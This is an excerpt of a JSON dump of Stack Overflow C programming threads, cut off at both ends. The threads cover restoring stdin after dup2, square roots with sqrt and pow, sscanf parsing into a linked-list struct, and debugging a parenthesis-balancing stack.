149, "user_id": 7902810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653be60b973fd63c21ef8f9c0357e950?s=128&d=identicon&r=PG&f=1", "display_name": "Yi Lin Liu", "link": "https://stackoverflow.com/users/7902810/yi-lin-liu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 818, "favorite_count": 0, "accepted_answer_id": 53924853, "answer_count": 1, "score": 4, "last_activity_date": 1560681492, "creation_date": 1545763445, "last_edit_date": 1560681492, "question_id": 53924800, "link": "https://stackoverflow.com/questions/53924800/how-to-recover-stdin-overwritten-by-dup2", "title": "How to recover stdin overwritten by dup2?", "body": "<p>I am trying to replace stdin with another pipe, then place the original stdin back to fd #0.</p>\n\n<p>e.g.</p>\n\n<pre><code>dup2(p, 0); // p is a pre-existing fd of a pipe\nexec(/* some commands */);\n\n//what will be here in order to have the original stdin back?\n\nscanf(...) //continue processing with original stdin.\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 5, "creation_date": 1545763553, "post_id": 53924792, "comment_id": 94691143, "body": "<a href=\"http://port70.net/~nsz/c/c11/n1570.html#7.12.7.5\" rel=\"nofollow noreferrer\"><code>sqrt()</code></a> from <code>&lt;math.h&gt;</code>?"}, {"owner": {"reputation": 806, "user_id": 3845784, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Zj4qZ.jpg?s=128&g=1", "display_name": "delirium", "link": "https://stackoverflow.com/users/3845784/delirium"}, "edited": false, "score": 0, "creation_date": 1545763701, "post_id": 53924792, "comment_id": 94691175, "body": "<code>sqrt()</code> seems to offer some performance advantage over <code>pow</code> <a href=\"https://stackoverflow.com/questions/17417490/difference-between-sqrtx-and-powx-0-5\">[1</a>]"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1545763836, "post_id": 53924792, "comment_id": 94691203, "body": "@Maria as you could have guessed from the comments, this is the same."}], "answers": [{"comments": [{"owner": {"reputation": 51, "user_id": 9717256, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a6bac9753a5a8cb10667f063cd9af653?s=128&d=identicon&r=PG&f=1", "display_name": "Maria", "link": "https://stackoverflow.com/users/9717256/maria"}, "edited": false, "score": 1, "creation_date": 1545764502, "post_id": 53924866, "comment_id": 94691354, "body": "r = (-(g/2) + pow(h, 0.5)); Also does the job, but I like your approach too."}], "tags": [], "owner": {"reputation": 93, "user_id": 5040070, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-hy7rYhs8bEs/AAAAAAAAAAI/AAAAAAAAAQQ/_s34OlH3WlQ/photo.jpg?sz=128", "display_name": "Saptarshi Soham Mohanta", "link": "https://stackoverflow.com/users/5040070/saptarshi-soham-mohanta"}, "is_accepted": true, "score": 2, "last_activity_date": 1545764130, "creation_date": 1545764130, "answer_id": 53924866, "question_id": 53924792, "link": "https://stackoverflow.com/questions/53924792/how-do-you-do-a-power-of-1-2-in-c/53924866#53924866", "title": "How do you do a power of 1/2 in C?", "body": "<p>Use <code>sqrt()</code> from <code>&lt;math.h&gt;</code>. The operation of H to the power of 0.5 is the <a href=\"https://www.dummies.com/education/math/algebra/how-to-convert-square-roots-to-exponents/\" rel=\"nofollow noreferrer\">same</a> as taking a square root of H. Use the inbuilt sqrt function to get a <a href=\"https://stackoverflow.com/questions/17417490/difference-between-sqrtx-and-powx-0-5\">performance advantage.</a></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\nint main () {\n   /*variable definitions*/\n   r = (-(g/2) + sqrt(h));\n   /*output*/\n   return(0);\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1545769055, "post_id": 53924903, "comment_id": 94692273, "body": "Your first point is valid \u2014 though an explanation of why (integer division) would be a good idea.  Your main answer seems to fly against the question commenting <i>&#39;I know about the <code>pow</code> function but I wish to do something else&#39;.</i>"}], "tags": [], "owner": {"reputation": 31, "user_id": 8144255, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EeuRhg7a7Bg/AAAAAAAAAAI/AAAAAAAABVY/YvhwiiK7hmM/photo.jpg?sz=128", "display_name": "Othman Khamra", "link": "https://stackoverflow.com/users/8144255/othman-khamra"}, "is_accepted": false, "score": 1, "last_activity_date": 1545769112, "last_edit_date": 1545769112, "creation_date": 1545764365, "answer_id": 53924903, "question_id": 53924792, "link": "https://stackoverflow.com/questions/53924792/how-do-you-do-a-power-of-1-2-in-c/53924903#53924903", "title": "How do you do a power of 1/2 in C?", "body": "<p>First of all, you need to know that if you try:</p>\n\n<pre><code>double x = 1/2;\nprintf(\"%f\",x);\n</code></pre>\n\n<p>you will get a result of <strong>0.0000</strong> </p>\n\n<p>Now for your equation:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\nint main()\n{\n   double r,g,h;\n   printf(\"Please enter g: \\n\");\n   scanf(\"%lf\", &amp;g);\n   printf(\"Please enter h: \\n\");\n   scanf(\"%lf\", &amp;h);\n   r = -1 * (g/2.0) + pow(h,0.5);\n   printf(\"The result is %lf\", r);\n   return 0;\n }\n</code></pre>\n"}], "owner": {"reputation": 51, "user_id": 9717256, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a6bac9753a5a8cb10667f063cd9af653?s=128&d=identicon&r=PG&f=1", "display_name": "Maria", "link": "https://stackoverflow.com/users/9717256/maria"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 256, "favorite_count": 0, "accepted_answer_id": 53924866, "answer_count": 2, "score": 2, "last_activity_date": 1545769112, "creation_date": 1545763384, "question_id": 53924792, "link": "https://stackoverflow.com/questions/53924792/how-do-you-do-a-power-of-1-2-in-c", "title": "How do you do a power of 1/2 in C?", "body": "<p>I just had a quick question in regards to do a power of 1/2 in C, I know about the pow function but I wish to do something else.</p>\n\n<p>My goal is to make the following line into code where h is elevated to 0.5\nR = -(g/2) + (h)\u00bd</p>\n\n<p>I have tried \nr = (-(g/2) + (h*\u00bd));</p>\n\n<p>but I doubt thats correct.</p>\n"}, {"tags": ["c", "scanf"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1545765574, "post_id": 53924433, "comment_id": 94691570, "body": "Please do not edit a question so as to invalidate answers once they are given."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1545765771, "post_id": 53924433, "comment_id": 94691606, "body": "Your code should read the &#39;Kevlar&#39; data.  You need to show how your structure is defined.  If you have <code>char *lamina_fiber</code> instead of a <code>char</code> array, you&#39;ve got problems, for example.  You should test the return value from <code>sscanf()</code>; if it is not 8, you have problems.  You should print out the string you are parsing (one of the <i>major</i> benefits of using <code>sscanf()</code> is that you <i>can</i> report the string that was being parsed; you can&#39;t do that with plain <code>scanf()</code>!).  You should report how many values were converted (the return value from <code>sscanf()</code>); you might print the strings it read."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1545766003, "post_id": 53924433, "comment_id": 94691657, "body": "Your original code used <code>%5.2f</code> \u2014 that&#39;s not a valid <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/sscanf.html\" rel=\"nofollow noreferrer\"><code>sscanf()</code></a> conversion specification.  You can&#39;t use the <code>.2</code> notation.  You can only specify a maximum width to convert.  That would account for the <code>sscanf()</code> failing on the numbers.  Even if you could use it, the <code>0.112</code> value would cause confusion."}, {"owner": {"user_type": "does_not_exist", "display_name": "user8753900"}, "edited": false, "score": 0, "creation_date": 1545766041, "post_id": 53924433, "comment_id": 94691667, "body": "I have added how I have defined my struct."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1545766122, "post_id": 53924433, "comment_id": 94691692, "body": "@AMD: Thanks \u2014 that structure definition is safe enough.  Strictly, you should use <code>%29s</code> in the <code>sscanf()</code> format string to limit the input strings, but that&#39;s a commonly overlooked refinement (even though it is important in production programs for security reasons \u2014 can you say <a href=\"https://stackoverflow.com/\">stack overflow</a>)."}], "answers": [{"comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1545764017, "post_id": 53924821, "comment_id": 94691247, "body": "@AMD you have only one <code>printf</code> statement which prints the whole line which you read with <code>fgets</code>. Please post the <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable example</a> that shows the problem. Show the input <i>in the question</i>. Nobody can replicate the problem as posted, and it is unclear exactly what the problem is."}, {"owner": {"reputation": 465, "user_id": 7840347, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yuln6.png?s=128&g=1", "display_name": "Jim Danner", "link": "https://stackoverflow.com/users/7840347/jim-danner"}, "edited": false, "score": 0, "creation_date": 1545764114, "post_id": 53924821, "comment_id": 94691270, "body": "@AMD The suggestion of Weather Vane is a good one. As it is, the <code>printf(&quot;%s\\n&quot;,rows[i])</code> command prints <code>rows[i]</code>, which is the <i>raw input</i>, not the result of <code>sscanf</code>."}, {"owner": {"reputation": 465, "user_id": 7840347, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yuln6.png?s=128&g=1", "display_name": "Jim Danner", "link": "https://stackoverflow.com/users/7840347/jim-danner"}, "edited": false, "score": 0, "creation_date": 1545765848, "post_id": 53924821, "comment_id": 94691621, "body": "@AMD As you have edited the code in your question, does it work correctly now?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user8753900"}, "edited": false, "score": 0, "creation_date": 1545766086, "post_id": 53924821, "comment_id": 94691680, "body": "@ Jim Danner: No it is not working correctly"}, {"owner": {"user_type": "does_not_exist", "display_name": "user8753900"}, "edited": false, "score": 0, "creation_date": 1545766281, "post_id": 53924821, "comment_id": 94691744, "body": "@ Weather Vane: I am sorry regarding the previous code, please disregard the if and the printf statements from the previous code. I believe the code posted as of now can be considered minimal, complete and verifiable?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1545766292, "post_id": 53924821, "comment_id": 94691748, "body": "@AMD: did you remember that arrays are indexed from 0?  Your loop starts at 1."}, {"owner": {"user_type": "does_not_exist", "display_name": "user8753900"}, "edited": false, "score": 0, "creation_date": 1545766382, "post_id": 53924821, "comment_id": 94691769, "body": "@ Jonathan Leffler: I am trying to skip the first row because it contains headings for every column and does not include the input. Therefore, I am trying to start from 1."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545766528, "post_id": 53924821, "comment_id": 94691798, "body": "@AMD the ideal <a href=\"http://stackoverflow.com/help/mcve\">MCVE</a> can be copy/pasted and compiled to replicate the problem. BTW please omit spaces from user names if you want to flag a commenter."}], "tags": [], "owner": {"reputation": 465, "user_id": 7840347, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yuln6.png?s=128&g=1", "display_name": "Jim Danner", "link": "https://stackoverflow.com/users/7840347/jim-danner"}, "is_accepted": false, "score": 1, "last_activity_date": 1545763612, "creation_date": 1545763612, "answer_id": 53924821, "question_id": 53924433, "link": "https://stackoverflow.com/questions/53924433/how-to-exactly-use-negated-character-classes-or-scansets-while-using-sscanf-on/53924821#53924821", "title": "How to exactly use (negated) character classes or scansets while using sscanf on a string?", "body": "<p>The conditional statements have two problems. The condition you have,</p>\n\n<pre><code>n=(sscanf(rows[i],\"%s %s %5.2f %5.2f %5.2f %5.2f %5.2f %5.2f\", \n  current-&gt;lamina_fiber,current-&gt;lamina_matrix,&amp;current-&gt;E1, \n  &amp;current-&gt;E2,&amp;current-&gt;p,&amp;current-&gt;v12,&amp;current-&gt;v21,&amp;current-&gt;G12))!=8\n</code></pre>\n\n<p>may look like it assigns the return value of <code>sscanf</code> (which should be 8) to <code>n</code>, and then checks whether that was 8 as it should be. But in fact it does something else: it assigns to <code>n</code> the result of the condition</p>\n\n<pre><code>(sscanf(rows[i],\"%s %s %5.2f %5.2f %5.2f %5.2f %5.2f %5.2f\", \n  current-&gt;lamina_fiber,current-&gt;lamina_matrix,&amp;current-&gt;E1, \n  &amp;current-&gt;E2,&amp;current-&gt;p,&amp;current-&gt;v12,&amp;current-&gt;v21,&amp;current-&gt;G12))!=8\n</code></pre>\n\n<p>which should be <code>true</code>, or since <code>n</code> is an integer, 1.</p>\n\n<p>The next problem is that your <code>if</code> condition ends with a <code>;</code> so there isn't anything that gets done or not depending in it; your program just continues with the next two statements: first printing </p>\n\n<blockquote>\n  <p>Problem!n=1</p>\n</blockquote>\n\n<p>and then printing the original input string, <code>rows[1]</code>.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8753900"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 74, "favorite_count": 0, "closed_date": 1545820270, "answer_count": 1, "score": 3, "last_activity_date": 1545766008, "creation_date": 1545759809, "last_edit_date": 1545766008, "question_id": 53924433, "link": "https://stackoverflow.com/questions/53924433/how-to-exactly-use-negated-character-classes-or-scansets-while-using-sscanf-on", "closed_reason": "Not suitable for this site", "title": "How to exactly use (negated) character classes or scansets while using sscanf on a string?", "body": "<p>I have multiple rows of strings and I want to store it in the form:</p>\n\n<pre><code>string1   string2   float1   float2   float3   float4   float5   float6\n</code></pre>\n\n<p>as in the conversion specifiers mentioned below.  For example:</p>\n\n<pre><code>Kevlar ABS 43.42 13.94 1.35 0.35 0.112 2.74\n</code></pre>\n\n<p>Two strings are Kevlar and ABS, the remaining 6 are numbers. There are white space characters between all 8 of them.</p>\n\n<p>I am wondering how I can use scansets or (negated) character classes only to store the required information in all the 8 conversion specifiers.</p>\n\n<p>The struct is declared as follows:</p>\n\n<pre><code> struct lamina\n {\n    char lamina_fiber[30];\n    char lamina_matrix[30];\n    float E1,E2,p,v12,v21,G12;\n    struct lamina *nextnode;\n };\n\n\n head=(struct lamina *)calloc(1,sizeof(struct lamina));\n current=head;\n\n for(int i=1;i&lt;=index_elements;i++)\n {\n     sscanf(rows[i],\"%s %s %f %f %f %f %f %f\", \n            current-&gt;lamina_fiber,current-&gt;lamina_matrix,&amp;current-&gt;E1, \n            &amp;current-&gt;E2,&amp;current-&gt;p,&amp;current-&gt;v12,&amp;current-&gt;v21, \n            &amp;current-&gt;G12);\n     current-&gt;nextnode=(struct lamina *)calloc(1,sizeof(struct lamina));\n     current=current-&gt;nextnode;\n }\n\n current=head;\n\n for(int i=1;i&lt;=index_elements;i++)\n {\n       printf(\"%s %s %f %f %f %f %f %f\", current-&gt;lamina_fiber, current-&gt;lamina_matrix,\n              current-&gt;E1, current-&gt;E2,current-&gt;p, current-&gt;v12,  \n              current-&gt;v21, current-&gt;G12);\n       current=current-&gt;nextnode;\n }\n</code></pre>\n\n<hr>\n\n<p>NB: Version 1 of the code in the question contained:</p>\n\n<pre><code>if(n=(sscanf(rows[i],\"%s %s %5.2f %5.2f %5.2f %5.2f %5.2f %5.2f\", \ncurrent-&gt;lamina_fiber,current-&gt;lamina_matrix,&amp;current-&gt;E1, \n&amp;current-&gt;E2,&amp;current-&gt;p,&amp;current-&gt;v12,&amp;current-&gt;v21,&amp;current-&gt;G12))!=8);\n</code></pre>\n\n<p>This explains the reference to <code>if</code> and a trailing semicolon in the answer.</p>\n"}, {"tags": ["c", "function", "parentheses"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 1, "creation_date": 1545753257, "post_id": 53923750, "comment_id": 94689203, "body": "Did you debug your code to observe values of relevant variables, including the return value of scanf(), while processing input?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 1, "creation_date": 1545753285, "post_id": 53923750, "comment_id": 94689208, "body": "You are ignoring the return value of scanf() at your own risk. Consider not to."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1545753372, "post_id": 53923750, "comment_id": 94689222, "body": "Offtopic: I&#39;d prefer using &#39;size&#39; instead of &#39;top&#39;, that&#39;s the more common idiom in C or C++ world (so empty stack gets 0). Then, as negative values are meaningless, I&#39;d prefer unsigned int or possibly even size_t."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 1, "creation_date": 1545753526, "post_id": 53923750, "comment_id": 94689263, "body": "OT again: Comparisons in C evaluate to 1 (true)/0 (false) anyway, so you might/should prefer <code>return sptr -&gt; top == -1;</code> (or size == 0, if you follow my previous recommendation)."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545753532, "post_id": 53923750, "comment_id": 94689265, "body": "Please learn about indentation, it will help you find more amenable minded potential answerers."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 1, "creation_date": 1545753869, "post_id": 53923750, "comment_id": 94689327, "body": "You <code>pop</code> with every character that&#39;s not an opening parenthesis of any type - this will fail if there are yet characters other than closing parentheses..."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1545753957, "post_id": 53923750, "comment_id": 94689343, "body": "Note that the dot <code>.</code> and arrow <code>-&gt;</code> operators bind very tightly; you should not put spaces around them."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545754733, "post_id": 53923750, "comment_id": 94689487, "body": "Also, <code>sizeof(char)</code> is always <code>1</code> by definition, so multiplying by <code>sizeof(char)</code> is pointless."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545754841, "post_id": 53923750, "comment_id": 94689510, "body": "Furthermore, don&#39;t cast the return value of <code>malloc</code>. <a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\" title=\"do i cast the result of malloc\">stackoverflow.com/questions/605845/&hellip;</a>"}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 1, "creation_date": 1545755197, "post_id": 53923750, "comment_id": 94689582, "body": "Instead of returning the result as a string (and a <code>malloc</code>&#39;d one at that, which must be freed by the caller), just return a boolean and then print <code>isBalanced(c, sptr) ? &quot;YES&quot; : &quot;NO&quot;</code>. The current naming is otherwise dangerously misleading; consider <code>if (isBalanced(c, sptr))</code> \u2013 this would be true for both cases. (And on the subject of naming: the <code>c</code> and <code>sptr</code> also unnecessarily obfuscated. Why not <code>text</code> and <code>stack</code>, for example.)"}, {"owner": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1545758201, "post_id": 53923750, "comment_id": 94690156, "body": "I would say that the semantic error is: not using the stack to check that a <i>closing</i> char matches the last corresponding <i>opening</i> one. In other words: you get an opening char, you push it; you get a closing char, you pop and check it matches. In the end, the stack must be empty."}, {"owner": {"reputation": 181, "user_id": 10669297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5ed42c958cac4ec8911e56a96020f78f?s=128&d=identicon&r=PG&f=1", "display_name": "dagwood", "link": "https://stackoverflow.com/users/10669297/dagwood"}, "reply_to_user": {"reputation": 3350, "user_id": 7332147, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e4GFL.png?s=128&g=1", "display_name": "linuxfan says Reinstate Monica", "link": "https://stackoverflow.com/users/7332147/linuxfan-says-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1545883394, "post_id": 53923750, "comment_id": 94718744, "body": "@linuxfan i did use a stack to push the opening brackets and pop and check match when closing brackets are come across. also ive checked if stack is not empty at the end as well."}, {"owner": {"reputation": 181, "user_id": 10669297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5ed42c958cac4ec8911e56a96020f78f?s=128&d=identicon&r=PG&f=1", "display_name": "dagwood", "link": "https://stackoverflow.com/users/10669297/dagwood"}, "reply_to_user": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545883502, "post_id": 53923750, "comment_id": 94718761, "body": "@Arkku thanks, ive made the corrections in my updated code. but it still shows NO on running for all inputs."}, {"owner": {"reputation": 181, "user_id": 10669297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5ed42c958cac4ec8911e56a96020f78f?s=128&d=identicon&r=PG&f=1", "display_name": "dagwood", "link": "https://stackoverflow.com/users/10669297/dagwood"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545883765, "post_id": 53923750, "comment_id": 94718799, "body": "@Yunnosch &quot;You are ignoring the return value of scanf() at your own risk. Consider not to.&quot; what does this mean ? why would scanf return anything useful. please elaborate."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1545886106, "post_id": 53923750, "comment_id": 94719186, "body": "The return to <code>scanf</code> is the number of successful conversions that took place based on your <i>format string</i>. For example <code>scanf(&quot;%s&quot;, c);</code> would return <code>1</code> for a successful conversion to string placed in <code>c</code>. <code>scanf</code> can also return <code>EOF</code> or <code>0</code> (for a failed conversion). You must check <code>if (scanf(&quot;%s&quot;, c) != 1) { &#47;* handler error *&#47; }</code> (at minimum) to validate the input. However, <code>scanf</code> is a poor choice as it will stop reading on the first whitespace encountered. A better choice if <code>fgets</code>. That way you could at least enter <code>8 + (4 &#47; a[2])</code> and get more than <code>&#39;8&#39;</code> as input."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 1, "creation_date": 1545989374, "post_id": 53923750, "comment_id": 94750446, "body": "Read the documentation of scanf(). Its return value is extremely useful when debugging any non-working program which contains any scanf() call. When you are driven to ask a question here but have not bothered to analyse the return values, then the risk of being ignored by potential answereres is higher than otherwise."}], "answers": [{"tags": [], "owner": {"reputation": 12106, "user_id": 4431643, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CoZjt.jpg?s=128&g=1", "display_name": "kiran Biradar", "link": "https://stackoverflow.com/users/4431643/kiran-biradar"}, "is_accepted": false, "score": 1, "last_activity_date": 1545754040, "last_edit_date": 1545754040, "creation_date": 1545753525, "answer_id": 53923805, "question_id": 53923750, "link": "https://stackoverflow.com/questions/53923750/semantical-error-with-parenthesis-balancing-here/53923805#53923805", "title": "semantical error with parenthesis balancing here", "body": "<p>In your <code>pop</code> function you are not decrementing the <code>top</code> thus your <code>isEmpty</code> function always returns <code>false</code>.</p>\n\n<p>Hence you return <code>no</code> always.</p>\n\n<pre><code>char* isBalanced(char* s, STACK* sptr)\n{\n    ....\n\n   if(isEmpty(sptr)) return y;\n   else return n;\n}\n</code></pre>\n\n<hr>\n\n<p>The following is the correct implementation:</p>\n\n<pre><code>char pop(STACK* sptr)\n{\n    if(isEmpty(sptr) == 0)\n        return sptr-&gt;s[sptr-&gt;top--];\n    else\n        return '$';\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 2, "creation_date": 1545755115, "post_id": 53923902, "comment_id": 94689568, "body": "So, basically, as it is, this does not work to check balanced brackets. Correct? It only ensures this <code>)1(</code> passes."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1545775256, "post_id": 53923902, "comment_id": 94693285, "body": "@usr2564301 yes - Christmas coding, but not after the edit"}], "tags": [], "owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "is_accepted": false, "score": 1, "last_activity_date": 1545775217, "last_edit_date": 1545775217, "creation_date": 1545754534, "answer_id": 53923902, "question_id": 53923750, "link": "https://stackoverflow.com/questions/53923750/semantical-error-with-parenthesis-balancing-here/53923902#53923902", "title": "semantical error with parenthesis balancing here", "body": "<p>I would add the flags to see which one does not match</p>\n\n<pre><code>unsigned match(const char *f)\n{\n    int p = 0,s = 0,b = 0;\n    while(*f)\n    {\n        switch(*f++)\n        {\n            case '(':\n                p++;\n                break;\n            case ')':\n                p -= !!p;\n                break;\n\n            case '[':\n                s++;\n                break;\n            case ']':\n                s -= !!s;\n                break;\n\n            case '{':\n                b++;\n                break;\n            case '}':\n                b -= !!b;\n                break;\n            